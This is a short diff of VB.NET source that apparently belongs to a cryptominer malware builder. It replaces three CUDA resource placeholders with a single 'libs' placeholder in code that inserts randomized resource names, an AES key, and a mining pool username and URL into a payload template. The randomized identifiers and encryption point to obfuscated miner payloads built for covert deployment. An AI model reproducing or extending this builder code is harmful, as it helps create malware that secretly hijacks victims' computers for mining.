@@ -36,9 +36,7 @@
     Public OutputPayload
     Public Resources_dll = Randomi(rand.Next(5, 10))
     Public Resources_xmr = Randomi(rand.Next(5, 10))
-    Public Resources_cuda1 = Randomi(rand.Next(5, 10))
-    Public Resources_cuda2 = Randomi(rand.Next(5, 10))
-    Public Resources_cuda3 = Randomi(rand.Next(5, 10))
+    Public Resources_libs = Randomi(rand.Next(5, 10))
     Public Resources_Parent = Randomi(rand.Next(5, 10))
     Public AESKEY As String = Randomi(rand.Next(5, 10))
 
@@ -71,9 +69,7 @@
             txtLog.Text = txtLog.Text + ("Starting..." + vbNewLine)
             Source = Replace(Source, "#dll", Resources_dll)
             Source = Replace(Source, "#xmr", Resources_xmr)
-            Source = Replace(Source, "#cuda1", Resources_cuda1)
-            Source = Replace(Source, "#cuda2", Resources_cuda2)
-            Source = Replace(Source, "#cuda3", Resources_cuda3)
+            Source = Replace(Source, "#libs", Resources_libs)
             Source = Replace(Source, "#ParentRes", Resources_Parent)
             Source = Replace(Source, "#USER", txtPoolUsername.Text)
             Source = Replace(Source, "#URL", txtPoolURL.Text)
